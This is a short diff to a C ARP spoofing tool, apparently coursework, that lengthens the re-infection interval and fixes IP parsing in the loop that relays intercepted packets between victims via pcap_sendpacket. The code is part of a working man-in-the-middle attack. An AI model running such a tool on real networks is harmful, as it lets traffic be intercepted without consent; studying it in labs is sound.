@@ -4,7 +4,7 @@
 #include <pcap.h>
 #include <time.h>
 #include "module.h"
-#define PERIOD 3 // seconds
+#define PERIOD 30 // seconds
 
 void usage() {
   printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
@@ -92,7 +92,11 @@ int main(int argc, char* argv[]) {
 
       for(int i = 0; i< SESSION_NUM; i++) {
         if(!active[i]) continue;
-        if(cmpMacAddress(ip_pkt -> eth_hdr.ether_shost, sender_mac[i]) && cmpMacAddress(ip_pkt -> eth_hdr.ether_dhost, attacker_mac[i]) && cmpIPAddress((uint8_t *)&(ip_pkt -> ip_hdr.ip_src), sender_ip[i])) {
+
+        uint8_t packet_src_ip[4], packet_dst_ip[4];
+        changeIP(packet_src_ip, &ip_pkt -> ip_hdr.ip_src.s_addr);
+        changeIP(packet_dst_ip, &ip_pkt -> ip_hdr.ip_dst.s_addr);
+        if(cmpMacAddress(ip_pkt -> eth_hdr.ether_shost, sender_mac[i]) && cmpMacAddress(ip_pkt -> eth_hdr.ether_dhost, attacker_mac[i]) && cmpIPAddress(packet_src_ip, sender_ip[i])) {
           printf("\n[+] Send Relay Packet!\n");
           printMacAddress("  Old Src MAC", ip_pkt -> eth_hdr.ether_shost);
           printMacAddress("  Old Dst MAC", ip_pkt -> eth_hdr.ether_dhost);
@@ -104,8 +108,8 @@ int main(int argc, char* argv[]) {
           memcpy(send_packet, packet, header -> caplen);
           memcpy(send_packet, ip_pkt, sizeof(struct arp_packet));
 
-          printIPAddress("  Source IP", (uint8_t *)&(ip_pkt -> ip_hdr.ip_src));
-          printIPAddress("  Target IP", (uint8_t *)&(ip_pkt -> ip_hdr.ip_dst));
+          printIPAddress("  Source IP", packet_src_ip);
+          printIPAddress("  Target IP", packet_dst_ip);
           pcap_sendpacket(handle, send_packet, header -> caplen);
         }
       }
